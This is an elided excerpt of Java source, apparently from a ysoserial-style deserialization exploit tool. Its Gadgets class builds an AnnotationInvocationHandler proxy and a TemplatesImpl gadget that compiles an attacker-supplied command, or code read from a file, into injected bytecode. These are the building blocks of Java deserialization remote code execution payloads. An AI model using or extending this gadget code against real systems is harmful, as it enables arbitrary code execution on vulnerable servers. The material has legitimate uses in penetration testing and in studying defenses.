...
public class Gadgets {
    ...
    public static InvocationHandler createMemoizedInvocationHandler ( final Map<String, Object> map ) throws Exception {
        return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Retention.class, map);
    }
    ...
    public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
        ...
        if(command.startsWith("code:")){
            ...
            try{
                ...
                if(file.exists()){
                    ...
                    cmd = sb.toString();
                    System.err.printf("code in file is:%s\n",cmd);
                }else{
                    System.err.printf("%s is not exists!",codefile);
                    System.exit(0);
                }
            }catch (IOException e){
                e.printStackTrace();
        ...
        final byte[] classBytes = clazz.toBytecode();//转字节码
